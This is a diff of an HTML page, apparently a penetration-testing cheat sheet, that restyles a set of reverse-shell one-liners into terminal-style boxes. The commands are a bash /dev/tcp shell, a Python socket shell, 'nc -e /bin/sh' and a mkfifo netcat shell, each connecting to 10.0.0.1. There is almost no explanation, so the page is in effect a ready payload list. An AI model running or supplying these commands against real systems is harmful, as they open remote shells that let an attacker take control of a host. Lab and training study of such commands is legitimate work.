@@ -15,31 +15,10 @@
             <span class="window_title">Bash</span>
         </div>
         <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span></span></span>
-
-<span class="token output">nixfund
-</span></code></pre></div>
+</code></pre></div>
 </div>
 
 <h3>Python</h3>
-
-<code>
-python -c 'import
-socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-</code>
-
-<br />
-<br />
-<h3>Netcat</h3>
-
-<code>
-nc -e /bin/sh 10.0.0.1 1234
-</code>
-<br>
-<br>
-<code>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-</code>
 
 <div class="window_container">
     <div class="window_content">
@@ -47,10 +26,36 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
             <span class="window_dot bg-danger"></span>
             <span class="window_dot bg-warning"></span>
             <span class="window_dot bg-success"></span>
-            <span class="window_title">Hostname</span>
+            <span class="window_title">Bash</span>
         </div>
-        <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"><span class="text-gray">CRYSTHOFFER@htb</span><span class="text-success">[/htb]</span></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">hostname</span></span></span>
+        <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span></span>
+</code></pre></div>
+</div>
 
-<span class="token output">nixfund
-</span></code></pre></div>
+<br />
+<br />
+<h3>Netcat</h3>
+
+<div class="window_container">
+    <div class="window_content">
+        <div class="window_top">
+            <span class="window_dot bg-danger"></span>
+            <span class="window_dot bg-warning"></span>
+            <span class="window_dot bg-success"></span>
+            <span class="window_title">Bash</span>
+        </div>
+        <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">nc -e /bin/sh 10.0.0.1 1234</span></span></span>
+</code></pre></div>
+</div>
+
+<div class="window_container">
+    <div class="window_content">
+        <div class="window_top">
+            <span class="window_dot bg-danger"></span>
+            <span class="window_dot bg-warning"></span>
+            <span class="window_dot bg-success"></span>
+            <span class="window_title">Bash</span>
+        </div>
+        <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output"></span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f</span></span></span>
+</code></pre></div>
 </div>
